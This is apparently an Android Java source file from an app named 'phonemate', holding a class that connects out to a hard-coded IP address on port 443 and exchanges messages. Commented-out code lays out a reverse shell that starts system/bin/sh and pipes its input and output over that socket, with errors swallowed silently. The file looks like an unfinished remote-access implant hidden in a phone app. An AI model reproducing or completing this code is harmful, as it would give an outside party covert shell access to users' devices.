package com.dextrotechnologies.phonemate;

import android.util.Log;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.Socket;

public class ConMan {

    public static void revConInit() throws Exception {
        // create a process around the shell
        // final Process process = Runtime.getRuntime().exec("system/bin/sh");

        // start a socket
        Socket socket = new Socket("192.168.18.24", 443);

        // forward streams until socket closes
        // forwardStream(socket.getInputStream(), process.getOutputStream());
        // forwardStream(process.getInputStream(), socket.getOutputStream());
        // forwardStream(process.getErrorStream(), socket.getOutputStream());

        // Input Socket
        BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));

        // Output Socket
        BufferedWriter out = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));

        // Perform Operations
        performOps(in, out);

        // Waiting for socket close
        socket.wait();

        // close the socket streams
        socket.getInputStream().close();
        socket.getOutputStream().close();
    }

    private static void performOps(BufferedReader in, BufferedWriter out) {
        new Thread(() -> {
            try {
                String incomingMessage = in.readLine() + System.getProperty("line.separator");
                Log.e("SOCK101", incomingMessage);

                out.write("OK", 0, 2);
                out.flush();
            } catch (Exception e) {
                // die silently
            } finally {
                try {
                    //closing input stream
                    in.close();
                    if (out != null) {
                        out.close();
                    }
                } catch (IOException e) {
                    // die silently
                }
            }
        }).start();
    }

    /*
    private static void forwardStream(final InputStream input, final OutputStream output) {
        new Thread(() -> {
            try {
                final byte[] buf = new byte[4096];
                int length;
                while ((length = input.read(buf)) != -1) {
                    if (output != null) {
                        output.write(buf, 0, length);
                        if (input.available() == 0) {
                            output.flush();
                        }
                    }
                }
            } catch (Exception e) {
                // die silently
            } finally {
                try {
                    input.close();
                    if (output != null) {
                        output.close();
                    }
                } catch (IOException e) {
                    // die silently
                }
            }
        }).start();
    }
     */
}
